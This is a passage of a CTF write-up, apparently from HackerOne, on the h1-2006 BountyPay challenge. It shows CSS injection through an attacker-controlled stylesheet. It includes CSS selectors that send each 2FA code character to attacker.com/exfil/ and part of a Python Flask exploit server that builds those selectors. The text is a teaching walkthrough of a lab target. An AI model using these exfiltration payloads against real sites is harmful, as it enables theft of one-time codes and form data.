class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\u003c/span\u003e\n\napp_style=https://u1w9neu3o71nmwn6ryh9o7zbg2msah.burpcollaborator.net/css/uni_2fa_style.css\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd I got a hit straight away:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"external-stylesheet-burp-collaborator.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/TyQZ5bav5NEXxkKPZMzdgJNh?response-content-disposition=attachment%3B%20filename%3D%22external-stylesheet-burp-collaborator.png%22%3B%20filename%2A%3DUTF-8%27%27external-stylesheet-burp-collaborator.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=a86466f0e2631ece2dc40822808f8a3dd654e32e00511f49f73d705966381c1d\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/TyQZ5bav5NEXxkKPZMzdgJNh?response-content-disposition=attachment%3B%20filename%3D%22external-stylesheet-burp-collaborator.png%22%3B%20filename%2A%3DUTF-8%27%27external-stylesheet-burp-collaborator.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=a86466f0e2631ece2dc40822808f8a3dd654e32e00511f49f73d705966381c1d\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eA few things are worth noting when inspecting the request received by Collaborator:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003ccode\u003eUser-Agent\u003c/code\u003e tells us that request was made from Headless Chrome. \u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FHeaders%2FSec-Fetch-Dest\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003eSec-Fetch-Dest: style\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e tells us that the resource would be embedded as a stylesheet (using \u003ccode\u003e\u0026lt;link ... rel=\u0026quot;stylesheet\u0026quot;\u0026gt;\u003c/code\u003e)\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eGiven that we only have a single injection point, I assumed the task would be to exfiltrate \u003ccode\u003echallenge_answer\u003c/code\u003e characters recursively. I was well aware of the relatively-recent technique for sequential exfiltration using \u003ccode\u003e@import\u003c/code\u003e directives, which you can read about in a brilliant blog post titled \u003ca href=\"/redirect?url=https%3A%2F%2Fmedium.com%2F%40d0nut%2Fbetter-exfiltration-via-html-injection-31c72a2dae8b\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eBetter Exfiltration via HTML Injection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e by \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fd0nutptr\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e@d0nutptr\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Worth mentioning that a similar technique was \u003ca href=\"/redirect?url=https%3A%2F%2Fvwzq.net%2Fslides%2F2019-s3_css_injection_attacks.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efirst discovered\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e half a year before by \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fcgvwzq\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eVila\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Note that this technique works in Chrome because Chrome processes \u003ccode\u003e@import\u003c/code\u003e directives asynchronously (executing the rest of CSS code while additional resources load). This, for instance, is not the case for Firefox that executes them sequentially, as was demonstrated by \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fsecuritymb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eMichał Bentkowski\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in another excellent blog post on this subject, titled \u003ca href=\"/redirect?url=https%3A%2F%2Fresearch.securitum.com%2Fcss-data-exfiltration-in-firefox-via-single-injection-point%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCSS data exfiltration in Firefox via a single injection point\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eSo the fact that page was loaded in Headless Chrome reaffirmed my intuition that we\u0026#39;re after sequential exfiltration using \u003ccode\u003e@import\u003c/code\u003e directives. d0nutptr actually wrote a \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fd0nutptr%2Fsic\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esic\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e tool available on GitHub that could be used to execute such an attack, but I wanted to try this for myself so I wrote the necessary exploit in Python..... only to realise that it\u0026#39;s not actually possible. As I have realized, Chrome only loads \u003ccode\u003e@import\u003c/code\u003e resources asynchronously when they appear within \u003ccode\u003e\u0026lt;style\u0026gt;\u003c/code\u003e elements in HTML. When they appear in the external stylesheets using \u003ccode\u003e\u0026lt;link\u0026gt;\u003c/code\u003e tag, however, Chrome stops CSS evaluation until the resource is loaded. It means that in our case sequential exfiltration isn\u0026#39;t actually possible.\u003c/p\u003e\n\n\u003cp\u003eFor a moment I even doubted whether this is about CSS exfiltration, so I even checked whether we could get XSS by injecting quotes into \u003ccode\u003eapp_style\u003c/code\u003eto escape the attribute value... but it was secure.\u003c/p\u003e\n\n\u003cp\u003eSo we\u0026#39;re back to the CSS exfiltration. Ok, since the sequential technique won\u0026#39;t work, let\u0026#39;s just try to at least get the first character, for a start. To get that, all we need is a same-old trick of a selector matching a certain input name/value. First I tried adding this to my stylesheet:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight css\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003einput\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nt\"\u003echallenge_answer\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003ebackground-image\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"sx\"\u003eurl(https://attacker.com/)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand didn\u0026#39;t get any hit. Ok, the input name must be different then - let\u0026#39;s widen that by just matching on a single character:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight css\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003einput\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"nt\"\u003ec\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003ebackground-image\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"sx\"\u003eurl(https://attacker.com/)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThat gives a hit, so we\u0026#39;re on the right track. But if the name is not \u003ccode\u003echallenge_answer\u003c/code\u003e but starts with \u003ccode\u003ec\u003c/code\u003e, what could that be? Re-reading the message again I realised that the name is likely to be \u003ccode\u003ecode\u003c/code\u003e:  \u003ccode\u003eWe have sent the payment challenge to your 2FA, you have 2 minutes to enter the code, please enter it below\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eWhen I tried an exact match on \u003ccode\u003ecode\u003c/code\u003e, I didn\u0026#39;t get any hit though:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight css\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003einput\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nt\"\u003ecode\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003ebackground-image\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"sx\"\u003eurl(https://attacker.com/)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo the name must be starting with the code then. At  this point I added a match on the first character of the value to see if I get anything back, and to my surprise I got 7 hits!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight css\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003einput\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"nt\"\u003ecode\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"nt\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003ebackground-image\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"sx\"\u003eurl(https://attacker.com/exfil/a)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003einput\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"nt\"\u003ecode\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e^=\u003c/span\u003e\u003cspan class=\"nt\"\u003eb\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003ebackground-image\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"sx\"\u003eurl(https://attacker.com/exfil/b)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e(I\u0026#39;ve used all ASCII letters, both uppercase and lowercase, and digits).\u003c/p\u003e\n\n\u003cp\u003eThis is when it struck me that there are, in fact, 7 separate inputs on the page, each containing a single character. This made perfect sense, as to exfiltrate such code we don\u0026#39;t need any sequential imports - we just need many selectors.\u003c/p\u003e\n\n\u003cp\u003eBut before we get there, we need to know exact names of inputs - because we need to know the exact order of characters. If we simply match on \u003ccode\u003einput[name^=code]\u003c/code\u003e we\u0026#39;d never know which character is at which place.\u003c/p\u003e\n\n\u003cp\u003eSo I quickly made another few iterations on progressively matching the next character to determine the input names and they turned out to be \u003ccode\u003ecode_1\u003c/code\u003e, \u003ccode\u003ecode_2\u003c/code\u003e, ..., \u003ccode\u003ecode_7\u003c/code\u003e. From there it was all really trivial.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026#39;s see what my final code looks like, and then we can break it down piece by piece:\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m using Flask here. Since it needs to be available on public internet and with a valid HTTPS certificate, I\u0026#39;m not focusing on how this could be ran / deployed. Rather, this shows Flask routes with all the relevant logic of the exploit.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003elogging\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003estring\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003ecollections\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003edefaultdict\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003etyping\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eList\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003euuid\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003euuid4\u003c/span\u003e\n\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eflask\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eurl_for\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecurrent_app\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\n\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003e.\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eblueprint\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003elogger\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003elogging\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003egetLogger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003e__name__\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eNUM_CHARS\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e7\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eALLOWED_CHARS\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003estring\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edigits\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003estring\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eascii_letters\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003estring\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epunctuation\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# Store exfiltrated results in a dict where keys are sessions and values are 7-element lists\n\u003c/span\u003e\u003cspan class=\"n\"\u003ecode_chars\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edefaultdict\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003elambda\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"bp\"\u003eNone\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003eNUM_CHARS\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eoriginal_css\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u0026quot;\n/**\nTemplate for the UNI 2FA App\n */\n\nbody {\n    background-color: #FFFFFF;\n}\n\ndiv.branding {\n    height:80px;\n    width:80px;\n    margin:20px auto 40px auto;\n    background-image:url(\u0026quot;https://www.bountypay.h1ctf.com/images/bountypay.png\u0026quot;);\n    background-position:center center;\n    background-repeat: no-repeat;\n    background-size: cover;\n}\n\u0026quot;\u0026quot;\u0026quot;\u003c/span\u003e\n\n\n\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003eblueprint\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;/uni_2fa_style.css\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003euni_2fa_style_css\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n    \u003cspan class=\"n\"\u003esession\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;session\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003euuid4\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ehex\u003c/span\u003e\u003cspan class=\"p\"\u003e[:\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eselector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epos\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eescape_css_selector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;code_{pos + 1}\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003evalue\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eescape_css_selector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ecallback\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eurl_for\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;.h1_2006_callback\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epos\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003epos\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e_external\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e_scheme\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;https\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;input[name=\u0026quot;{name}\u0026quot;][value=\u0026quot;{value}\u0026quot;]{{background-image: url({callback});}}\u0026#39;\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003eselectors\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eselector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epos\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003epos\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eNUM_CHARS\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003echar\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003eALLOWED_CHARS\u003c/span\u003e\u003cspan 